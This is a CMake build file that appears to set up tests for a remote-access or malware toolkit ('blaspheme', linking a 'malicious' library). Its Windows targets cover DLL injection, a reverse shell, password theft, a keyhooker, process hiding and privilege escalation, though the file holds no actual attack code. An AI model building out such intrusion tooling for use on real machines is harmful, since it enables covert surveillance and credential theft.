# Windows specific tests
if(WIN32)
	file(GLOB_RECURSE dll_source_files dll/*)
	add_library(dll SHARED ${dll_source_files})
	target_link_libraries(dll system network blaspheme malicious common gdi32 userenv)

	file(GLOB_RECURSE injection_source_files injection/*)
	add_executable(injection ${injection_source_files})
	target_link_libraries(injection common malicious system network)
	add_dependencies(injection dll)

	file(GLOB_RECURSE registre_source_files registre/*)
	add_executable(registre ${registre_source_files})
	target_link_libraries(registre system network common)

	file(GLOB_RECURSE rshell_source_files rshell/*)
	add_executable(rshell ${rshell_source_files})
	target_link_libraries(rshell common network)

	file(GLOB_RECURSE passwords_source_files passwords/*)
	add_executable(passwords ${passwords_source_files})
	target_link_libraries(passwords malicious userenv common network)

	file(GLOB_RECURSE keyhooker_source_files keyhooker/*)
	add_executable(keyhooker ${keyhooker_source_files})
	target_link_libraries(keyhooker system malicious common network)

	file(GLOB_RECURSE pipe_source_files pipe/*)
	add_executable(pipe ${pipe_source_files})
	target_link_libraries(pipe system common network)

	file(GLOB_RECURSE hideproc_source_files hideproc/*)
	add_executable(hideproc ${hideproc_source_files})
	target_link_libraries(hideproc system malicious common network)
	
	file(GLOB_RECURSE mail_source_files mail/*)
	add_executable(mail ${mail_source_files})
	target_link_libraries(mail system common network)
	
	file(GLOB_RECURSE elevation_source_files elevation/*)
	add_executable(elevation ${elevation_source_files})
	target_link_libraries(elevation system common network malicious)
	
	file(GLOB_RECURSE elevation64_source_files elevation64/*)
	add_executable(elevation64 ${elevation64_source_files})
	target_link_libraries(elevation64 system common network malicious)
	
endif ()

# Global tests
file(GLOB_RECURSE transfer_source_files transfer/*)
add_executable(transfer ${transfer_source_files})
target_link_libraries(transfer system network common blaspheme)
